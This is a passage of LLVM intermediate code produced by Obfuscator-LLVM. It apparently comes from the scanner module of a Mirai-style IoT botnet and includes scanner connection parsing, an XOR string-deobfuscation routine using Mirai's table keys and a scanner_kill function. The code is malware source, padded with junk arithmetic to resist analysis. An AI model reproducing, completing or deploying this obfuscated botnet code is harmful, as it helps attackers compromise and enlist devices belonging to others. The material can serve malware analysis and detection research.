  store i8* %28, i8** %4, align 8
  %29 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %30 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %29, i32 0, i32 7
  %31 = getelementptr inbounds [8192 x i8], [8192 x i8]* %30, i32 0, i32 0
  %32 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %33 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %32, i32 0, i32 4
  %34 = load i32, i32* %33, align 8
  %35 = load i8*, i8** %4, align 8
  %36 = load i32, i32* %6, align 4
  %37 = add i32 %36, 342484629
  %38 = sub i32 %37, 1
  %39 = sub i32 %38, 342484629
  %40 = sub nsw i32 %36, 1
  %41 = call i32 @util_memsearch(i8* %31, i32 %34, i8* %35, i32 %39)
  store i32 %41, i32* %5, align 4
  call void @table_lock_val(i8 zeroext 12)
  %42 = load i32, i32* %5, align 4
  %43 = icmp eq i32 %42, -1
  br i1 %43, label %44, label %45

; <label>:44:                                     ; preds = %27
  store i32 0, i32* %2, align 4
  br label %47

; <label>:45:                                     ; preds = %27
  %46 = load i32, i32* %5, align 4
  store i32 %46, i32* %2, align 4
  br label %47

; <label>:47:                                     ; preds = %45, %44, %25, %15
  %48 = load i32, i32* %2, align 4
  ret i32 %48
}

declare i32 @util_memsearch(i8*, i32, i8*, i32) #2

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #1

; Function Attrs: noinline nounwind uwtable
define i32 @szprintf(i8*, i8*, ...) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %7 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %6, i32 0, i32 0
  %8 = bitcast %struct.__va_list_tag* %7 to i8*
  call void @llvm.va_start(i8* %8)
  %9 = load i8*, i8** %4, align 8
  %10 = load i8*, i8** %5, align 8
  %11 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %6, i32 0, i32 0
  %12 = call i32 @vsprintf(i8* %9, i8* %10, %struct.__va_list_tag* %11) #7
  %13 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %6, i32 0, i32 0
  %14 = bitcast %struct.__va_list_tag* %13 to i8*
  call void @llvm.va_end(i8* %14)
  %15 = load i32, i32* %3, align 4
  ret i32 %15
}

; Function Attrs: nounwind
declare i8* @strcat(i8*, i8*) #1

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #3

; Function Attrs: nounwind
declare void @llvm.va_start(i8*) #7

; Function Attrs: nounwind
declare i32 @vsprintf(i8*, i8*, %struct.__va_list_tag*) #1

; Function Attrs: nounwind
declare void @llvm.va_end(i8*) #7

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #1

; Function Attrs: noinline nounwind uwtable
define internal signext i8 @can_consume(%struct.scanner_connection*, i8*, i32) #0 {
  %4 = alloca %struct.scanner_connection*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  store %struct.scanner_connection* %0, %struct.scanner_connection** %4, align 8
  store i8* %1, i8** %5, align 8
  store i32 %2, i32* %6, align 4
  %8 = load %struct.scanner_connection*, %struct.scanner_connection** %4, align 8
  %9 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %8, i32 0, i32 7
  %10 = getelementptr inbounds [8192 x i8], [8192 x i8]* %9, i32 0, i32 0
  %11 = load %struct.scanner_connection*, %struct.scanner_connection** %4, align 8
  %12 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %11, i32 0, i32 4
  %13 = load i32, i32* %12, align 8
  %14 = sext i32 %13 to i64
  %15 = getelementptr inbounds i8, i8* %10, i64 %14
  store i8* %15, i8** %7, align 8
  %16 = load i8*, i8** %5, align 8
  %17 = load i32, i32* %6, align 4
  %18 = sext i32 %17 to i64
  %19 = getelementptr inbounds i8, i8* %16, i64 %18
  %20 = load i8*, i8** %7, align 8
  %21 = icmp ult i8* %19, %20
  %22 = zext i1 %21 to i32
  %23 = trunc i32 %22 to i8
  ret i8 %23
}

; Function Attrs: nounwind
declare i8* @realloc(i8*, i64) #1

; Function Attrs: noinline nounwind uwtable
define internal i8* @deobf(i8*, i32*) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  store i8* %0, i8** %3, align 8
  store i32* %1, i32** %4, align 8
  %7 = load i8*, i8** %3, align 8
  %8 = call i32 @util_strlen(i8* %7)
  %9 = load i32*, i32** %4, align 8
  store i32 %8, i32* %9, align 4
  %10 = load i32*, i32** %4, align 8
  %11 = load i32, i32* %10, align 4
  %12 = sub i32 0, %11
  %13 = sub i32 0, 1
  %14 = add i32 %12, %13
  %15 = sub i32 0, %14
  %16 = add nsw i32 %11, 1
  %17 = sext i32 %15 to i64
  %18 = call noalias i8* @malloc(i64 %17) #7
  store i8* %18, i8** %6, align 8
  %19 = load i8*, i8** %6, align 8
  %20 = load i8*, i8** %3, align 8
  %21 = load i32*, i32** %4, align 8
  %22 = load i32, i32* %21, align 4
  %23 = add i32 %22, 2009552928
  %24 = add i32 %23, 1
  %25 = sub i32 %24, 2009552928
  %26 = add nsw i32 %22, 1
  call void @util_memcpy(i8* %19, i8* %20, i32 %25)
  store i32 0, i32* %5, align 4
  br label %27

; <label>:27:                                     ; preds = %105, %2
  %28 = load i32, i32* %5, align 4
  %29 = load i32*, i32** %4, align 8
  %30 = load i32, i32* %29, align 4
  %31 = icmp slt i32 %28, %30
  br i1 %31, label %32, label %111

; <label>:32:                                     ; preds = %27
  %33 = load i8*, i8** %6, align 8
  %34 = load i32, i32* %5, align 4
  %35 = sext i32 %34 to i64
  %36 = getelementptr inbounds i8, i8* %33, i64 %35
  %37 = load i8, i8* %36, align 1
  %38 = sext i8 %37 to i32
  %39 = xor i32 %38, -1
  %40 = and i32 -1013144147, %39
  %41 = xor i32 -1013144147, -1
  %42 = and i32 %38, %41
  %43 = xor i32 222, -1
  %44 = and i32 %43, -1013144147
  %45 = and i32 222, %41
  %46 = or i32 %40, %42
  %47 = or i32 %44, %45
  %48 = xor i32 %46, %47
  %49 = xor i32 %38, 222
  %50 = trunc i32 %48 to i8
  store i8 %50, i8* %36, align 1
  %51 = load i8*, i8** %6, align 8
  %52 = load i32, i32* %5, align 4
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds i8, i8* %51, i64 %53
  %55 = load i8, i8* %54, align 1
  %56 = sext i8 %55 to i32
  %57 = xor i32 %56, -1
  %58 = and i32 800978209, %57
  %59 = xor i32 800978209, -1
  %60 = and i32 %56, %59
  %61 = xor i32 173, -1
  %62 = and i32 %61, 800978209
  %63 = and i32 173, %59
  %64 = or i32 %58, %60
  %65 = or i32 %62, %63
  %66 = xor i32 %64, %65
  %67 = xor i32 %56, 173
  %68 = trunc i32 %66 to i8
  store i8 %68, i8* %54, align 1
  %69 = load i8*, i8** %6, align 8
  %70 = load i32, i32* %5, align 4
  %71 = sext i32 %70 to i64
  %72 = getelementptr inbounds i8, i8* %69, i64 %71
  %73 = load i8, i8* %72, align 1
  %74 = sext i8 %73 to i32
  %75 = xor i32 %74, -1
  %76 = and i32 -648313598, %75
  %77 = xor i32 -648313598, -1
  %78 = and i32 %74, %77
  %79 = xor i32 190, -1
  %80 = and i32 %79, -648313598
  %81 = and i32 190, %77
  %82 = or i32 %76, %78
  %83 = or i32 %80, %81
  %84 = xor i32 %82, %83
  %85 = xor i32 %74, 190
  %86 = trunc i32 %84 to i8
  store i8 %86, i8* %72, align 1
  %87 = load i8*, i8** %6, align 8
  %88 = load i32, i32* %5, align 4
  %89 = sext i32 %88 to i64
  %90 = getelementptr inbounds i8, i8* %87, i64 %89
  %91 = load i8, i8* %90, align 1
  %92 = sext i8 %91 to i32
  %93 = xor i32 %92, -1
  %94 = and i32 -1957212524, %93
  %95 = xor i32 -1957212524, -1
  %96 = and i32 %92, %95
  %97 = xor i32 239, -1
  %98 = and i32 %97, -1957212524
  %99 = and i32 239, %95
  %100 = or i32 %94, %96
  %101 = or i32 %98, %99
  %102 = xor i32 %100, %101
  %103 = xor i32 %92, 239
  %104 = trunc i32 %102 to i8
  store i8 %104, i8* %90, align 1
  br label %105

; <label>:105:                                    ; preds = %32
  %106 = load i32, i32* %5, align 4
  %107 = sub i32 %106, 873162928
  %108 = add i32 %107, 1
  %109 = add i32 %108, 873162928
  %110 = add nsw i32 %106, 1
  store i32 %109, i32* %5, align 4
  br label %27

; <label>:111:                                    ; preds = %27
  %112 = load i8*, i8** %6, align 8
  ret i8* %112
}

declare void @util_memcpy(i8*, i8*, i32) #2

; Function Attrs: noinline nounwind uwtable
define void @scanner_kill() #0 {
  %1 = load i32, i32* @scanner_pid, align 4
  %2 = call i32 @kill(i32 %1, i32 9) #7
  ret void
}

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { argmemonly nounwind }
attributes #4 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #6 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #7 = { nounwind }
attributes #8 = { noreturn nounwind }
attributes #9 = { nounwind readnone }
attributes #10 = { nounwind readonly }

!llvm.ident = !{!0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146781110}
!2 = !{i32 -2146780704}
!3 = !{i32 -2146590635}
!4 = !{i32 -2146590226}
